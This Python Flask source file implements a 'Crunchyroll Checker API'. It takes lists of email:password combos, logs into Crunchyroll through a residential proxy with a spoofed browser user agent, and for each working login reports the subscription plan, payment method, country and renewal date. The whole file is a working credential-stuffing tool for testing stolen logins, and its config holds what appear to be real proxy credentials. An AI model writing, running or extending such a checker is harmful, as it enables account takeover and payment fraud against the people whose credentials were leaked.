from flask import Flask, request, jsonify
import requests
from datetime import datetime
import pytz
import time

# === CONFIG ===
AUTH_HEADER = "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6"
PROXY = "la.residential.rayobyte.com:8000:ndq79_gofastmail_online:Sufyan33"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"

app = Flask(__name__)

# === CORE CHECK FUNCTION ===
def check_crunchyroll(email, password, attempt=1):
    session = requests.Session()

    # --- Proxy Setup ---
    if PROXY:
        parts = PROXY.replace("http://", "").replace("https://", "").split(":")
        if len(parts) == 4:
            host, port, user, pwd = parts
            proxy_url = f"http://{user}:{pwd}@{host}:{port}"
        else:
            proxy_url = "http://" + PROXY
        session.proxies = {"http": proxy_url, "https": proxy_url}

    headers = {"User-Agent": UA, "Accept": "*/*"}

    try:
        # Step 1: Initial GET
        r = session.get("https://www.crunchyroll.com/", headers=headers, timeout=25)
        if r.status_code != 200 and attempt < 2:
            return check_crunchyroll(email, password, attempt + 1)

        # Step 2: Login
        login_headers = {
            "User-Agent": UA,
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://sso.crunchyroll.com",
            "Referer": "https://sso.crunchyroll.com/login"
        }
        login_json = {"email": email, "password": password, "eventSettings": {}}
        login_res = session.post(
            "https://sso.crunchyroll.com/api/login",
            json=login_json,
            headers=login_headers,
            timeout=25
        )
        if "invalid_credentials" in login_res.text or login_res.status_code != 200:
            return {"email": email, "password": password, "status": "invalid"}
        device_id = session.cookies.get("device_id")
        if not device_id:
            return {"email": email, "password": password, "status": "invalid"}

        # Step 3: Token
        token_headers = {
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": AUTH_HEADER,
            "Origin": "https://www.crunchyroll.com"
        }
        token_data = {
            "device_id": device_id,
            "device_type": "Firefox on Windows",
            "grant_type": "etp_rt_cookie"
        }
        token_res = session.post(
            "https://www.crunchyroll.com/auth/v1/token",
            data=token_data,
            headers=token_headers,
            timeout=25
        )
        if token_res.status_code != 200:
            return {"email": email, "password": password, "status": "invalid"}
        js = token_res.json()
        token = js.get("access_token")
        account_id = js.get("account_id")
        if not (token and account_id):
            return {"email": email, "password": password, "status": "invalid"}

        # Step 4: Subscription details
        subs_headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Authorization": f"Bearer {token}"
        }
        subs_res = session.get(
            f"https://www.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions",
            headers=subs_headers,
            timeout=25
        )
        if subs_res.status_code != 200:
            return {"email": email, "password": password, "status": "invalid"}
        data = subs_res.json()
        if not data or not data.get("subscriptions"):
            return {"email": email, "password": password, "status": "invalid"}

        sub = data["subscriptions"][0]
        plan = sub.get("plan", {}).get("tier", {}).get("text", "N/A")
        plan_val = sub.get("plan", {}).get("tier", {}).get("value", "N/A")
        plan_full = f"{plan} — {plan_val}"
        trial = str(sub.get("activeFreeTrial", False)).capitalize()
        renew = sub.get("nextRenewalDate", "N/A")
        status = sub.get("status", "N/A")
        payment = data.get("currentPaymentMethod", {})
        pay_name = payment.get("name", "N/A")
        pay_type = payment.get("paymentMethodType", "N/A")
        country = payment.get("countryCode", "Unknown")

        if renew not in ["N/A", None]:
            try:
                renew_dt = datetime.strptime(renew, "%Y-%m-%dT%H:%M:%SZ").replace(tzinfo=pytz.UTC)
                formatted_renewal_date = renew_dt.strftime("%d-%m-%Y")
                ist = pytz.timezone("Asia/Kolkata")
                now = datetime.now(ist)
                days_left = max((renew_dt.astimezone(ist) - now).days, 0)
            except Exception:
                formatted_renewal_date = renew
                days_left = "N/A"
        else:
            formatted_renewal_date = "N/A"
            days_left = "N/A"

        return {
            "email": email,
            "password": password,
            "status": "premium",
            "country": country,
            "plan": plan_full,
            "payment": f"{pay_name} ({pay_type})",
            "trial": trial,
            "account_status": status,
            "renewal": formatted_renewal_date,
            "days_left": days_left
        }

    except Exception as e:
        if attempt < 2:
            time.sleep(1)
            return check_crunchyroll(email, password, attempt + 1)
        return {"email": email, "password": password, "status": "error", "message": str(e)}

# === API ROUTE ===
@app.route("/check", methods=["GET"])
def check():
    raw = request.args.get("email")
    if not raw:
        return jsonify({
            "status": "error",
            "message": "Usage: /check?email=email:pass or multiple separated by commas/newlines"
        })

    # Split by comma or newline
    if "\n" in raw:
        combos = [x.strip() for x in raw.split("\n") if ":" in x]
    elif "," in raw:
        combos = [x.strip() for x in raw.split(",") if ":" in x]
    else:
        combos = [raw.strip()]

    results = []
    for combo in combos:
        email, password = combo.split(":", 1)
        res = check_crunchyroll(email.strip(), password.strip())
        results.append(res)

    return jsonify({"status": "success", "results": results})

@app.route("/", methods=["GET"])
def index():
    return jsonify({
        "message": "Crunchyroll Checker API",
        "usage": "/check?email=email:pass or multiple combos separated by commas/newlines"
    })

if __name__ == "__main__":
    app.run("0.0.0.0", 5000)
